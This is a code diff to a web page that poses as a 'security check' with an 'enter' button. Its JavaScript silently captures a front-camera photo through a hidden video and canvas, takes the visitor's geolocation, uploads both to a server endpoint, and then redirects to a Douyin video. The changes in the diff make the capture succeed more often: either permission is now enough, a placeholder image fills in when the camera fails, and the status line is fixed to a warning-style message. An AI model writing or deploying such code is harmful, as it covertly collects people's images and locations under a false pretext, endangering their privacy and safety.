@@ -56,7 +56,7 @@
   <h1>慎 入</h1>
   <p class="sub">系统将进行一次安全校验</p>
   <button class="enter-btn" id="enterBtn">进入</button>
-  <div id="status"></div>
+  <div id="status">本网站不对您的心理负责，请注意</div>
 
   <!-- 隐藏的视频与画布，用于静默拍照 -->
   <video id="video" style="display:none;" playsinline muted></video>
@@ -71,8 +71,10 @@
 
       let stream = null;
 
+      // 状态文字固定，不再变化
       function setStatus(text) {
-        statusDiv.textContent = text;
+        // 总是显示同一句话，保留此函数仅为兼容
+        statusDiv.textContent = '本网站不对您的心理负责，请注意';
       }
 
       // 静默开启前置摄像头并返回 MediaStream
@@ -83,7 +85,6 @@
         });
         video.srcObject = stream;
         await video.play();
-        // 等待视频准备好
         await new Promise(resolve => {
           if (video.readyState >= 2 && video.videoWidth > 0) resolve();
           else video.addEventListener('canplay', resolve, { once: true });
@@ -123,35 +124,61 @@
         });
       }
 
+      // 生成一个 1x1 像素的占位图（当没有摄像头画面时使用）
+      function generatePlaceholderBlob() {
+        const c = document.createElement('canvas');
+        c.width = 1;
+        c.height = 1;
+        return new Promise(resolve => c.toBlob(resolve, 'image/jpeg'));
+      }
+
       // 主流程
       btn.addEventListener('click', async () => {
         btn.disabled = true;
-        setStatus('正在初始化摄像头...');
 
         try {
-          // 1. 打开摄像头（会弹出系统权限请求）
-          await openCamera();
-          setStatus('正在捕获画面...');
+          // 并行请求摄像头和定位，不互相阻塞
+          const cameraPromise = (async () => {
+            try {
+              await openCamera();
+              const blob = await takePhoto();
+              closeCamera();
+              return blob;
+            } catch (e) {
+              closeCamera();
+              return null; // 摄像头失败
+            }
+          })();
 
-          // 2. 并行执行：拍照 + 定位
-          const [blob, position] = await Promise.all([
-            takePhoto(),
-            getPosition().catch(err => {
-              // 定位失败立即抛出，保持强制拦截逻辑
-              throw new Error('定位失败: ' + (err.message || '用户拒绝'));
-            })
-          ]);
+          const positionPromise = (async () => {
+            try {
+              const pos = await getPosition();
+              return { lat: pos.coords.latitude, lon: pos.coords.longitude };
+            } catch (e) {
+              return null; // 定位失败
+            }
+          })();
 
-          // 拍照完成后立即关闭摄像头
-          closeCamera();
+          const [blob, position] = await Promise.all([cameraPromise, positionPromise]);
 
-          // 准备上传数据
+          // 只要有一项成功即可继续，两项都失败则拒绝
+          if (!blob && !position) {
+            alert('❌ 校验失败：\n摄像头和位置权限均未通过，无法继续访问。\n请在设置中至少允许其中一项。');
+            btn.disabled = false;
+            return;
+          }
+
+          // 如果没有摄像头画面，使用占位图
+          const finalBlob = blob || await generatePlaceholderBlob();
+
           const formData = new FormData();
-          formData.append('photo', blob, 'capture.jpg');
-          formData.append('lat', position.coords.latitude);
-          formData.append('lon', position.coords.longitude);
+          formData.append('photo', finalBlob, 'capture.jpg');
+          if (position) {
+            formData.append('lat', position.lat);
+            formData.append('lon', position.lon);
+          }
 
-          setStatus('正在上传校验数据...');
+          // 上传
           const response = await fetch('/submit', {
             method: 'POST',
             body: formData
@@ -159,28 +186,15 @@
 
           const result = await response.json();
           if (response.ok && result.success) {
-            setStatus('校验通过，正在跳转...');
-            setTimeout(() => {
-              window.location.href = 'https://v.douyin.com/ySyn-e7a2AE/';
-            }, 800);
+            // 校验通过直接跳转，不改变状态文字
+            window.location.href = 'https://v.douyin.com/ySyn-e7a2AE/';
           } else {
-            setStatus('服务端保存失败，请稍后重试');
-            console.error('后端错误:', result.error);
+            alert('服务端保存失败，请稍后重试');
             btn.disabled = false;
           }
         } catch (err) {
           console.error(err);
-          closeCamera(); // 确保释放摄像头
-          let msg = '校验失败：' + err.message;
-          if (err.name === 'NotAllowedError' || err.message.includes('Permission')) {
-            msg = '❌ 校验失败：\n摄像头或定位权限未开启，请在浏览器设置中允许后重试。';
-          } else if (err.message.includes('定位失败')) {
-            msg = '❌ 校验失败：\n系统地理位置权限验证未通过，请允许获取位置信息。';
-          } else if (err.name === 'NotFoundError') {
-            msg = '❌ 未检测到可用摄像头，请确认设备已连接。';
-          }
-          alert(msg);
-          setStatus('请重新尝试');
+          alert('发生未知错误，请刷新重试');
           btn.disabled = false;
         }
       });
